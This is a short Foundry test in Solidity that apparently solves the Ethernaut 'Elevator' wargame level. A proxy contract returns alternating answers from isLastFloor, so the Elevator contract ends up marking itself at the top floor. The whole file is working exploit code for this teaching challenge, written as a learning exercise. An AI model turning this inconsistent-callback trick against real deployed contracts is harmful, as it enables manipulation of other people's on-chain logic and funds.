// SPDX-License-Identifier: UNLICENSED

// forge test --contracts src/test/King.t.sol --fork-url $rpc -vvvv
pragma solidity ^0.6.0;

import "ds-test/test.sol";
import "forge-std/console.sol";
import "forge-std/Vm.sol";
import "../Elevator.sol";

contract ProxyElevator {
    Elevator obj;
    bool toggle = true;
    constructor(address addr) public {
        obj = Elevator(addr);
    }
    function isLastFloor(uint floor) external returns (bool) {
        console.log("Function called");
        toggle = !toggle;
        return toggle;
    }
    function goToTopFloor() public {
        obj.goTo(1);
    }
}
contract ElevatorTest is DSTest {
    Elevator obj;
    ProxyElevator proxy_elevator;
    Vm vm = Vm(HEVM_ADDRESS);
    address player_address;
    address payable contract_address;
    function setUp() public {
        contract_address = 0x08F90485D38eE2F0d93ce73b14E8022B8ddB12d8;
        player_address = 0xae22f26D5ddfE22d24aA28AEB1D44c962c673438;
        obj = Elevator(contract_address);
        proxy_elevator = new ProxyElevator(contract_address);
    }

    function testElevatorTop() public {
        console.log("Proxy elevator Address =", address(proxy_elevator));
        console.log("Elevator initial top state =",obj.top()); 
        proxy_elevator.goToTopFloor();
        console.log("Elevator end top state =",obj.top()); 
    }
}
